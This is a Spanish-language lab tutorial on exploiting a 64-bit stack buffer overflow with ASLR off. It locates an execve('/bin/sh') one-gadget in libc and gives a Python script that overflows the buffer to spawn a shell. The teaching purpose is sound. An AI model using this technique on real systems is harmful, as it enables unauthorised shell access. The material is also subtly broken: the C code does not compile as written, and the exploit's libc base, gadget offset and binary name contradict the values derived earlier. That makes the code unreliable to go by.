# Explicación de exploit 64 bits

Este ejercicio ilustra cómo se haría una explotación en un entorno de 64 bits. 
Importante: Se va a hacer con ASLR desactivado. En el ejercicio de format string (el reto), tendremos ASLR activo y veremos cómo hacer bypass. 

## Código fuente

El código fuente es: 

```c
#include<stdio.h> 
#include<string.h> 


void vuln()
{ 
  char buf[100]; 
  strcpy(buf,argv[1]); 
  printf("Input was: %s\n",buf); 
  return 0; 
}


int main(int argc, char *argv[]) 
{
  vuln();
}



```



#### Análisis de la vulnerabilidad. 

La vulnerabilidad es la típica de buffer overflow. Tendremos que encontrar el offset. Tenemos un offset de 120 bytes. 


#### Búsqueda de un one-gadget  

Tenemos que encontrar un gadget que ejecute `execve ("/bin/sh", 0,0)`. Para eso inspeccionamos la libc: 

```
root@kali:~/bufferoverflow/stackOverflow/x64# ldd ./vuln  # Miramos el fichero libc que se está usando
        linux-vdso.so.1 (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e12000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
root@kali:~/bufferoverflow/stackOverflow/x64# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Volcamos el desensamblado (formato Intel) en el fichero dump

root@kali:~/bufferoverflow/stackOverflow/x64# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Buscamos /bin/sh y la encontramos en el offset 0x183cee
 183cee /bin/sh
root@kali:~/bufferoverflow/stackOverflow/x64# cat dump | grep execve -B5 | grep rdi -C3 | grep 183cee -C3
   c84d8:       00 00 
   c84da:       4c 89 ea                mov    rdx,r13
   c84dd:       4c 89 e6                mov    rsi,r12
   c84e0:       48 8d 3d 07 b8 0b 00    lea    rdi,[rip+0xbb807]        # 183cee <_libc_intl_domainname@@GLIBC_2.2.5+0x17e>
   c84e7:       e8 94 f9 ff ff          call   c7e80 <execve@@GLIBC_2.2.5>
--
   c8592:       48 85 c0                test   rax,rax
--
   e6646:       e8 15 59 00 00          call   ebf60 <__close@@GLIBC_2.2.5>
   e664b:       48 8b 05 5e 28 0d 00    mov    rax,QWORD PTR [rip+0xd285e]        # 1b8eb0 <__environ@@GLIBC_2.2.5-0x3eb0>
   e6652:       48 8d 74 24 60          lea    rsi,[rsp+0x60]
   e6657:       48 8d 3d 90 d6 09 00    lea    rdi,[rip+0x9d690]        # 183cee <_libc_intl_domainname@@GLIBC_2.2.5+0x17e>
   e665e:       48 8b 10                mov    rdx,QWORD PTR [rax]
   e6661:       e8 1a 18 fe ff          call   c7e80 <execve@@GLIBC_2.2.5>
--
root@kali:~/bufferoverflow/stackOverflow/x64# 

```
Anotamos la dirección 0xe664b como la que va a permitir ejecutar la función execve. 

Ahora sumamos dicho offset a la dirección base en la que se carga la LIBC (como hemos deshabilitado ASLR se carga siempre en el mismo sitio --> el que hemos obtenido con ldd): 

Dirección de gadget: `0x00007ffff7e12000 + 0xe664b`


Escribimos el siguiente exploit: 

from os import system
from struct import pack
junk='A'*120
libc_base=0x00007ffff79f5000
onegadget=pack("Q",libc_base+0xfccde)        #gadget address
payload = junk + onegadget
with open("tmp","w") as f:
 f.write(payload)
system("./buf64 `cat tmp`") #because of null bytes
